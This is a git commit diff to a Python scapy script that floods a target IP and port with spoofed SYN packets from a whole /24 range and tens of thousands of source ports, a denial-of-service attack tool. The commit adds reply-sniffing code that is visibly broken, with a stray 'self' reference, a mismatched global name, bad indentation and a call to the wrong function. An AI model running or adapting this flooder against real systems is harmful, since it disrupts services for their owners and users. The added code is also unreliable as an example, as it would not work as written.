5c7d460be4fd61aff529728b46fba0c12e330fc5
Ezzeldin Tahoun <15705851+ezzeldinadel@users.noreply.github.com>
2019-07-04 17:37:13 -0400

    syn stats

--- src/ezSYN_FLOOD.py
+++ src/ezSYN_FLOOD.py
@@ -22,8 +22,23 @@ import sys
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
+_sport= "0" 
+_sip="0" 
+
+def match_packet(pkt):
+    if pkt.haslayer(IP) and pkt[IP].dst == _sip \
+       and pkt.haslayer(TCP) and pkt[TCP].dport == _sport:
+       return True
+    return False
+
+def _sr1(pkt, dport):
+  send(pkt)
+  dporrt=str(dport)
+  ans = sniff(filter="tcp port %s"%dporrt,lfilter=self.match_packet,count=1,timeout=1)
+  return ans[0] if ans else None
 
 def main(arguments):
+    global _sip,sport
     src_net = "150.150.150."
     dst_ip = arguments["<dst_ip>"]
     dst_port = int(arguments["<dst_port>"])
@@ -38,11 +53,13 @@ def main(arguments):
     print("# Shooting at: {dst_ip}".format(dst_ip=dst_ip))
     print("###########################################\n")
     for src_host in range(1,254):
+         _sip = str(src_host )
         if verbose or very_verbose:
             print("[*] We are sending spoofed SYN packets from {src_net}{src_host}".format(src_net=src_net,src_host=src_host))
             print("--------------------------------------------")
 
         for src_port in range(1024, 65535):
+            _sport= str(src_port)
             if very_verbose:
                 print("[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}".format(src_net=src_net,src_host=src_host,src_port=src_port))
 
@@ -52,7 +69,8 @@ def main(arguments):
             transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")
 
             # Send the packet
-            send(network_layer/transport_layer, verbose=False)
+         #   send(network_layer/transport_layer, verbose=False)
+            sr1(network_layer/transport_layer,dst_port)
 
             if sleep != 0:
                 time.sleep(sleep)
